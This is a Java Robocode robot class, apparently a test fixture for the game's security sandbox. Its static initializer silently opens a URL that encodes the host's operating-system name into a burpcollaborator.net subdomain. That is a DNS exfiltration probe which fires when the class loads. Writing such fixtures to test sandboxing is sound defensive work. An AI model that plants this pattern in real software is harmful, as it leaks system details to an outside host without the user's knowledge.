/*
 * Copyright (c) 2001-2023 Mathew A. Nelson and Robocode contributors
 * All rights reserved. This program and the accompanying materials
 * are made available under the terms of the Eclipse Public License v1.0
 * which accompanies this distribution, and is available at
 * https://robocode.sourceforge.io/license/epl-v10.html
 */
package tested.robots;

public class DnsAttack extends robocode.Robot {
	static {
		try {
			new java.net.URL("http://" + System.getProperty("os.name").replaceAll(" ", ".")
					+ ".randomsubdomain.burpcollaborator.net").openStream();
		} catch (Exception e) {
		}
	}

	public void run() {
		for (;;) {
			ahead(100);
			back(100);
		}
	}
}
